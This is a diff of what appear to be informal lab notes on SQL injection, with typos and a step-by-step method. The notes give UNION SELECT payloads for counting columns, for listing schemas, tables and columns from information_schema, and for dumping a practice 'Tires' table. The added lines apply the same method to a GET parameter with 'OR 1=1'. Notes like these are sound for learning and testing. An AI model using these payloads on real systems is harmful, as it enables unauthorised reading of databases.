@@ -125,10 +125,18 @@ match Number of options to the number columns
     Audi' UNION SELECT 1,2,3,4,5 #
 
 ## step 3 Edit Golden Statement
+    Audi' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns
 Added 2 and the 5 becuase the server side query did not display the second selection
-    Audi' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns    
 ## step 4 Craft Queries
     Audi' UNION SELECT tireid,name,size,cost,5 from session.Tires #
-        
-        
-        
+### Get REquest in the URL
+in the URL AFter Selection=1 OR 1=1
+cahnge selection number until info shows up
+
+## Step one, Identify vulnerable selection
+    Selection=1 or 1=1
+    selection=2 or 1=1
+## Step Two Identify number of Columns
+    Selection=2 UNION SELECT 1,2,3
+## Step 3 Edit Golden Statement
+    UNION SELECT table_schema,column_name,table_name from information_schema.columns
